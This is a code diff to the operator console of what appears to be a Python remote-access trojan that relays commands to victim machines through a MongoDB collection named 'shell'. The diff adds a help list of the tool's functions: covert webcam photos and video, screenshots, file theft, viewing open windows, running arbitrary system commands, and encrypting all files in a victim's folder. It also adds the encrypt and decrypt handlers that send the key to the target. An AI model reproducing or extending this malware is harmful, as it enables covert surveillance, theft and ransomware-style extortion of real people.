@@ -26,8 +26,36 @@ db=client['shell']
 
 fs=gridfs.GridFS(db)
 
-MY_COMMANDS=['targetlist','shifttarget','webcam','vwebcam','exit','e','quit','q','commands','dir','cd','cd..','deletefile','createfile','snap','getfile','showimg','mkdir','rmdir','activewindows','getfilesize','disks','encrypt','decrypt','targetinfo','getalltypefiles','refreshserver','system']
-IGNORE_COMMANDS_ON_NETWORK=['targetlist','webcam','vwebcam','shifttarget','exit','e','quit','q','commands','targetinfo','refreshserver']
+MY_COMMANDS=['targetlist','commandsdict','shifttarget','webcam','vwebcam','exit','e','quit','q','commands','dir','cd','cd..','deletefile','createfile','snap','getfile','showimg','mkdir','rmdir','activewindows','getfilesize','disks','encrypt','decrypt','targetinfo','getalltypefiles','refreshserver','system']
+IGNORE_COMMANDS_ON_NETWORK=['targetlist','shifttarget','exit','e','quit','q','commands','targetinfo','refreshserver','commandsdict']
+
+COMMANDS_DICT=[
+    'targetlist : --> shows all victims',
+    "shifttarget : --> takes an arg of victim's computer hostname to shift the target to that machine",
+    "webcam : --> takes victim's selfie automatically",
+    "vwebcam : --> takes an arg of time in second to capture a video of that time limit",
+    "exit,e,quit,q : --> to exit from terminal",
+    "commands : --> list of all existing commands",
+    "dir : --> show contents of a directory",
+    "cd : --> 1 step forward navigate for path",
+    "cd.. : --> 1 step backward navigate for path",
+    "deletefile : --> delete an existing file. Takes the filename as arg.",
+    "createfile : --> create a  file. Takes the filename as arg.",
+    "snap : --> taking a snapshot of victim's current screen",
+    "getfile : --> get an existing small file. Takes the filename as arg.",
+    "getalltypefiles : --> get big files. Takes the filename as arg.",
+    "showimg : --> show an image. Takes the image-name as arg.",
+    "mkdir : --> makes a directory. Takes the folder-name as arg.",
+    "rmdir : --> delete a full or empty entire folder. Takes the folder-name as arg.",
+    "activewindows : --> in victim's machine which tabs are open in background.",
+    "getfilesize : --> get the size of any file. Takes the filename as arg.",
+    "disks : --> present disk-drives of victim's machine.",
+    "encrypt : --> encrypt any file. If you pass * as arg means all files of that dir will be encrypted or you can pass a particular filename in arg.",
+    "decrypt : --> decrypt any file. If you pass * as arg means all files of that dir will be decrypted or you can pass a particular filename in arg.",
+    "targetinfo : --> details about victim machine.",
+    "refreshserver : --> helps to restart if any mistake.",
+    "system : --> can pass any cmd command as an arg."
+]
 
 CWD=r""
 LAST_PATH=""
@@ -49,6 +77,11 @@ def has_active_internet():
         return False
     else:
         return True
+
+def command_dict():
+    print(Fore.CYAN+">>> ")
+    for c,i in enumerate(COMMANDS_DICT,start=1):
+        print(Fore.LIGHTRED_EX+str(c)+" "+Fore.CYAN+i)
 
 def targetInfo():
     global PUBLIC_IP
@@ -386,6 +419,51 @@ def ActionUploader():
             for i in MY_COMMANDS:
                 print(i)
             print()
+
+        elif a[0]=='commandsdict':
+            command_dict()
+
+        elif a[0]=='encrypt':
+            with open('secret.key','rb') as seckey:
+                key=seckey.read()
+            target_element=target_strings(a,1)
+            data={
+                    "action":a[0],
+                    "target_element":target_element,
+                    "target":TARGET,
+                    "key":str(key,'utf-8'),
+                    "current_path":CWD,
+                    "is_systemCommand":0
+                    }
+            if not (col.find_one()):
+                    col.insert_one(data)
+            else:
+                    filters={
+                        "target":TARGET
+                    }
+                    col.delete_one(filters)
+                    col.insert_one(data)
+
+        elif a[0]=='decrypt':
+            with open('secret.key','rb') as seckey:
+                key=seckey.read()
+            target_element=target_strings(a,1)
+            data={
+                    "action":a[0],
+                    "target_element":target_element,
+                    "target":TARGET,
+                    "key":str(key,'utf-8'),
+                    "current_path":CWD,
+                    "is_systemCommand":0
+                    }
+            if not (col.find_one()):
+                    col.insert_one(data)
+            else:
+                    filters={
+                        "target":TARGET
+                    }
+                    col.delete_one(filters)
+                    col.insert_one(data)
 
         elif a[0]=='webcam' and len(a)==1:
                 data={
